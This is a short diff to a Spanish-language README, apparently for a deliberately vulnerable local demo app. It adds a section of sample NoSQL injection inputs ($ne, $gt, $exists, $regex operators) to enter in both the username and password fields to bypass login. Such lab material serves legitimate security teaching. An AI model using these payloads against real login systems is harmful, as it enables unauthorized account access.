@@ -41,6 +41,12 @@ npm start
 http://localhost:8000
 ```
 
+## Inyecciones de ejemplo
 
+Se puedne probar estas entradas para poder verificar la vulnerabilidad del sistema 
 
-
+** DEBEN PONERSE TANTO EN EL APARTADO DE USUARIO COMO EN LA CONTRASEÑA **
+{ "$ne": null }
+{ "$gt": "" }
+{ "$exists": true }
+{ "$regex": ".*" }
